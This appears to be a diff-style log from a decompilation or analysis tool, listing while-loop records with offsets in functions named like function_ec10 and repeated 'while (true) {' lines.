+++++++++ WHILE START : 26387 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 26448 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 70 @ function_ec10 ====================================
+++++++++ WHILE START : 26465 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 26526 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 71 @ function_ec10 ====================================
+++++++++ WHILE START : 26531 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 26592 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 72 @ function_ec10 ====================================
+++++++++ WHILE START : 26616 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 26677 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 73 @ function_ec10 ====================================
+++++++++ WHILE START : 26682 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 26743 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 74 @ function_ec10 ====================================
+++++++++ WHILE START : 26760 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 26821 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 75 @ function_ec10 ====================================
+++++++++ WHILE START : 26826 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 26887 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 76 @ function_ec10 ====================================
+++++++++ WHILE START : 26918 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 26979 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 77 @ function_ec10 ====================================
+++++++++ WHILE START : 26984 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 27045 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 78 @ function_ec10 ====================================
+++++++++ WHILE START : 27063 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 27124 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 79 @ function_ec10 ====================================
+++++++++ WHILE START : 27130 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 27185 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 80 @ function_ec10 ====================================
+++++++++ WHILE START : 27231 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 27286 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 81 @ function_ec10 ====================================
+++++++++ WHILE START : 27292 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 27347 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 82 @ function_ec10 ====================================
+++++++++ WHILE START : 27365 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 27420 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 83 @ function_ec10 ====================================
+++++++++ WHILE START : 27426 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 27481 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 84 @ function_ec10 ====================================
+++++++++ WHILE START : 27506 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 27561 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 85 @ function_ec10 ====================================
+++++++++ WHILE START : 27567 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 27622 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 86 @ function_ec10 ====================================
+++++++++ WHILE START : 27640 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 27695 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 87 @ function_ec10 ====================================
+++++++++ WHILE START : 27701 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 27756 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 88 @ function_ec10 ====================================
+++++++++ WHILE START : 27818 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 27873 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 89 @ function_ec10 ====================================
+++++++++ WHILE START : 27879 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 27934 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 90 @ function_ec10 ====================================
+++++++++ WHILE START : 27952 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 28007 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 91 @ function_ec10 ====================================
+++++++++ WHILE START : 28013 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 28060 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 92 @ function_ec10 ====================================
+++++++++ WHILE START : 28085 
+++++++++ WHILE FUNCTION : function_ec10 
+++++++++ WHILE END : 28132 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 96 @ function_f814 ====================================
+++++++++ WHILE START : 31276 
+++++++++ WHILE FUNCTION : function_f814 
+++++++++ WHILE END : 31624 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 97 @ function_fbb8 ====================================
+++++++++ WHILE START : 32005 
+++++++++ WHILE FUNCTION : function_fbb8 
+++++++++ WHILE END : 32624 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 103 @ function_ff08 ====================================
+++++++++ WHILE START : 33229 
+++++++++ WHILE FUNCTION : function_ff08 
+++++++++ WHILE END : 33524 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 175 @ function_103e8 ====================================
+++++++++ WHILE START : 35928 
+++++++++ WHILE FUNCTION : function_103e8 
+++++++++ WHILE END : 36005 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 178 @ function_1057c ====================================
+++++++++ WHILE START : 36278 
+++++++++ WHILE FUNCTION : function_1057c 
+++++++++ WHILE END : 36402 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 180 @ function_106c0 ====================================
+++++++++ WHILE START : 36555 
+++++++++ WHILE FUNCTION : function_106c0 
+++++++++ WHILE END : 36669 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 182 @ function_107dc ====================================
+++++++++ WHILE START : 36853 
+++++++++ WHILE FUNCTION : function_107dc 
+++++++++ WHILE END : 37294 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 193 @ function_10a74 ====================================
+++++++++ WHILE START : 37717 
+++++++++ WHILE FUNCTION : function_10a74 
+++++++++ WHILE END : 38247 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 226 @ function_11790 ====================================
+++++++++ WHILE START : 42665 
+++++++++ WHILE FUNCTION : function_11790 
+++++++++ WHILE END : 42695 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 229 @ function_12334 ====================================
+++++++++ WHILE START : 45157 
+++++++++ WHILE FUNCTION : function_12334 
+++++++++ WHILE END : 45238 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 231 @ function_12688 ====================================
+++++++++ WHILE START : 46459 
+++++++++ WHILE FUNCTION : function_12688 
+++++++++ WHILE END : 46551 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
